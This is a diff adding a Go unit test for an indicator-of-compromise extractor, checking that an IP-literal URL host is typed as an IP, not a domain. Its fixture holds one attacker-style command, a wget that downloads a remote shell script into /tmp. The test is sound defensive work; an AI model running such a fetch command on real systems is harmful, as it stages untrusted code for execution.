@@ -145,6 +145,32 @@ func TestExtractDomainFromURL(t *testing.T) {
 	}
 }
 
+// TestExtractIPLiteralURLHostIsIP guards the fix for an IP-literal URL host
+// (http://203.0.113.9/x) being mistyped as a domain IOC. It must be classified
+// as an IP, and never appear under the domain type.
+func TestExtractIPLiteralURLHostIsIP(t *testing.T) {
+	e := NewExtractor()
+	ev := makeIOCEvent("198.51.100.7", "command",
+		"wget http://203.0.113.9/x.sh -O /tmp/x.sh", nil)
+	iocs := e.Extract(ev)
+
+	for _, i := range iocs {
+		if i.Type == IOCTypeDomain && i.Value == "203.0.113.9" {
+			t.Error("IP-literal URL host was extracted as a domain IOC")
+		}
+	}
+	// The URL host 203.0.113.9 must be present as an IP IOC.
+	var hostAsIP bool
+	for _, i := range iocs {
+		if i.Type == IOCTypeIP && i.Value == "203.0.113.9" {
+			hostAsIP = true
+		}
+	}
+	if !hostAsIP {
+		t.Error("expected the IP-literal URL host 203.0.113.9 as an IP IOC")
+	}
+}
+
 // ---- hash extraction ----
 
 func TestExtractSHA256(t *testing.T) {
